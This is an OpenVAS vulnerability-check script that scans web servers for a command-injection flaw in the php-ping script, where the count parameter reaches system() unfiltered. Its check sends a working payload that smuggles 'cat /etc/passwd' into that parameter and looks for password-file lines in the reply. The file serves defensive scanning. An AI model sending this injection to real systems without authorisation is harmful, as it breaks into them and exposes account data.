# OpenVAS Vulnerability Test
# $Id: php_ping_code_execution.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Remote Code Execution in PHP Ping
#
# Authors:
# Noam Rathaus
#
# Copyright:
# Copyright (C) 2003 Noam Rathaus
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "php-ping is a simple php script executing the 'ping' command.

A bug in this script allows users to execute arbitary commands.
The problem is based upon the fact that not all user inputs are filtered 
correctly: although $host is filtered using preg_replace(), the $count 
variable is passed unfiltered to the system() command.";

# From: ppp-design [security@ppp-design.de]
# Subject: php-ping: Executing arbritary commands
# Date: Monday 29/12/2003 16:51

if(description)
{
  script_id(11966);
  script_version("$Revision: 17 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(9309);
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  name = "Remote Code Execution in PHP Ping";
  script_name(name);
 
  desc = "
  Summary:
  " + tag_summary;

  script_description(desc);
 
  summary = "Detect PHP Ping Code Execution";
  script_summary(summary);
 
  script_category(ACT_GATHER_INFO);
 
  script_copyright("This script is Copyright (C) 2003 Noam Rathaus");

  family = "Web application abuses";
  script_family(family);
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

debug = 0;

port = get_http_port(default:80);

if ( ! get_port_state(port) ) exit(0);
if ( ! can_host_php(port:port) ) exit(0);


function check_dir(path)
{
 req = http_get(item:string(path, "/php-ping.php?count=1+%26+cat%20/etc/passwd+%26&submit=Ping%21"), port:port);

 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);
 if (egrep(pattern:"root:.*:0:[01]:.*", string:res))
 {
  security_hole(port);
  exit(0);
 }
}

foreach dir (cgi_dirs())
{
 check_dir(path:dir);
}
